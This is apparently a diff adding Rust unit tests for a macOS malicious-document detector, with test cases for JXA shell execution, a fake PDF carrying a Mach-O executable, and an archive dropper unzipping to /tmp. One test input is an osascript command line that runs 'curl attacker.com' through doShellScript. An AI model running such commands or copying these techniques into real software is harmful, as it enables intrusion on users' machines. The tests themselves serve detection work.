+    fn jxa_execution_fires_malicious_document() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3030, 500, "/usr/bin/osascript", "-l JavaScript -e 'var app=Application(\"System Events\"); app.doShellScript(\"curl attacker.com\")'", "interpreter");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_malicious_document(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_jxa_execution"),
+            "osascript -l JavaScript with shell call should fire JXA alert"
+        );
+    }
+
+    #[test]
+    fn fake_pdf_fires_malicious_document() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let home = std::env::var("HOME").unwrap_or_default();
+        let mut event = make_file_event_with_magic(
+            "file_created",
+            &format!("{}/Downloads/invoice.pdf", home),
+            Some("Mach-O 64-bit executable"),
+        );
+        event.timestamp = now;
+        ctx.recent_file_events.push(event);
+        let events = detect_malicious_document(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_fake_pdf_detected"),
+            "PDF file with Mach-O magic bytes should fire fake PDF alert"
+        );
+    }
+
+    #[test]
+    fn archive_dropper_fires_from_interpreter() {
+        let now = Utc::now();
+        let mut ctx = empty_ctx(now);
+        let mut p = make_process(3031, 500, "/usr/bin/unzip", "/tmp/payload.zip -d /tmp/", "user_app");
+        p.parent_process_kind = Some("interpreter".to_string());
+        ctx.recent_processes.push(p);
+        let events = detect_malicious_document(&ctx);
+        assert!(
+            events.iter().any(|e| e.event_type == "alert_archive_dropper_execution"),
+            "unzip to /tmp from interpreter should fire archive dropper alert"
         );
     }
 }
